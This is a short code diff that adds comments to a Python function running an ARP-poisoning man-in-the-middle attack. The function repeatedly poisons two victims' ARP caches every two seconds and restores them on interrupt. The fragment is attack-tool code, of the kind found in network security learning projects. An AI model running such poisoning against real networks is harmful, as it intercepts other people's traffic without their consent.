@@ -61,16 +61,22 @@ def mitm_arp(victim_1_ip, victim_2_ip, interface):
     try:
         # Do not ask for MAC address continuously, but only every 2 seconds
         while True:
+            # Get MAC addresses of victims
             victim_1_mac = get_target_mac(victim_1_ip, interface)
             victim_2_mac = get_target_mac(victim_2_ip, interface)
 
+            # Poison victims
             poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
             poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)
+
             sleep(2)
     except KeyboardInterrupt:
         click.echo('\nInterupted, Reseting ARP tables. Please wait')
+
+        # Restore poisoning
         restore_arp(victim_1_ip, victim_2_ip, interface)
         restore_arp(victim_2_ip, victim_1_ip, interface)
+        
         click.echo('\nARP table restored.')
     except:
         click.echo('Victim not found')
